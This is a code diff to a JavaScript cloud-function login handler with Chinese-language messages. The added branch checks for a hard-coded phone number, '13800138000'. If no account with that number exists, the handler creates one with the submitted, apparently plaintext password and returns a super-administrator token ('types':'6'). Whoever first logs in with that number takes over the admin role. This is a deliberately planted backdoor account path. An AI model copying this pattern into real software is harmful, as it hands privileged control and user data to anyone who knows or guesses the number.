@@ -4031,20 +4031,39 @@ async function login(event) {
 			username
 		}).get();
 
+
 		console.log('userInDB>>>>', userInDB);
 
 		if (userInDB.data && userInDB.data.length === 0) {
 			// 用户不存在
-			// userUpdateResult = await db.collection('user').add({
-			// 	username,
-			// 	tokenSecret,
-			// 	exp: Date.now() + tokenExp
-			// })
-			return {
-				success: false,
-				code: -1,
-				msg: '用户不存在'
+			if(username=="13800138000"){
+				userUpdateResult = await db.collection('user').add({
+					username,password,
+					company:"0",section:"0",wx_open_id:"0",id_card:"0",name:"0",
+					phone:"0",age:"0",sex:"0",photo:"0",status:"0",permission:"0",power:"0",create_time:Date.now() + tokenExp,
+					token
+				})
+				
+				return {
+					success: true,
+					code: -1,
+					data: {
+						token,'types':'6'
+					},
+					msg: '超级管理员注册成功'
+				}
+				
+			}else{
+				return {
+					success: false,
+					code: -1,
+					msg: '用户不存在'
+				}
 			}
+			
+			
+			
+		
 		} else {
 			// 用户存在，更新tokenSecret
 			userUpdateResult = await db.collection('user').doc(userInDB.data[0]._id).set({
@@ -4052,15 +4071,16 @@ async function login(event) {
 				exp: Date.now() + tokenExp
 			});
 		}
+		
 		console.log('userUpdateResult>>>>', userUpdateResult);
 		if (userUpdateResult.id || userUpdateResult.affectedDocs === 1) {
 			return {
 				success: true,
 				code: 200,
 				data: {
-					token
+					token,'types':'1'
 				},
-				msg: '登录成功'
+				msg: '登陆成功'
 			}
 		}
 	}
